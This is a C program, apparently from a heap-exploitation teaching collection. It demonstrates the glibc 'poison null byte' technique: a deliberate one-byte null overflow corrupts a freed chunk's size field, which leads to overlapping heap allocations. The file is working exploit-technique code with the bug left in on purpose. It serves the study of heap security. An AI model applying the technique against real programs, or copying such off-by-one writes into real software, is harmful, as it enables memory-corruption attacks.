#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>


int main()
{
	fprintf(stderr, "Welcome to poison null byte 2.0!\n");
	fprintf(stderr, "Tested in Ubuntu 14.04 64bit.\n");
	fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* c;
	uint8_t* b1;
	uint8_t* b2;
	uint8_t* d;
	void *barrier;

	fprintf(stderr, "We allocate 0x100 bytes for 'a'.\n");
	a = (uint8_t*) malloc(0x100);
	fprintf(stderr, "a: %p\n", a);
	int real_a_size = malloc_usable_size(a);
	fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
		"(it may be more than 0x100 because of rounding): %#x\n", real_a_size);

	/* chunk size attribute cannot have a least significant byte with a value of 0x00.
	 * the least significant byte of this will be 0x10, because the size of the chunk includes
	 * the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0x200);

	fprintf(stderr, "b: %p\n", b);

	c = (uint8_t*) malloc(0x100);
	fprintf(stderr, "c: %p\n", c);

	barrier =  malloc(0x100);
	fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
		"The barrier is not strictly necessary, but makes things less confusing\n", barrier);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);

	// this technique works by overwriting the size metadata of a free chunk
	free(b);
	
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
	fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_use\n");
	fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);

	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
	fprintf(stderr, "c.prev_size is %#lx\n",*c_prev_size_ptr);

	b1 = malloc(0x100);

	fprintf(stderr, "b1: %p\n",b1);
	fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
		"At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
	fprintf(stderr, "Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
	fprintf(stderr, "We malloc 'b2', our 'victim' chunk.\n");
	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control

	b2 = malloc(0x80);
	fprintf(stderr, "b2: %p\n",b2);

	memset(b2,'B',0x80);
	fprintf(stderr, "Current b2 content:\n%s\n",b2);

	fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");

	free(b1);
	free(c);
	
	fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.\n");
	d = malloc(0x300);
	fprintf(stderr, "d: %p\n",d);
	
	fprintf(stderr, "Now 'd' and 'b2' overlap.\n");
	memset(d,'D',0x300);

	fprintf(stderr, "New b2 content:\n%s\n",b2);

	fprintf(stderr, "Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf "
		"for the clear explanation of this technique.\n");
}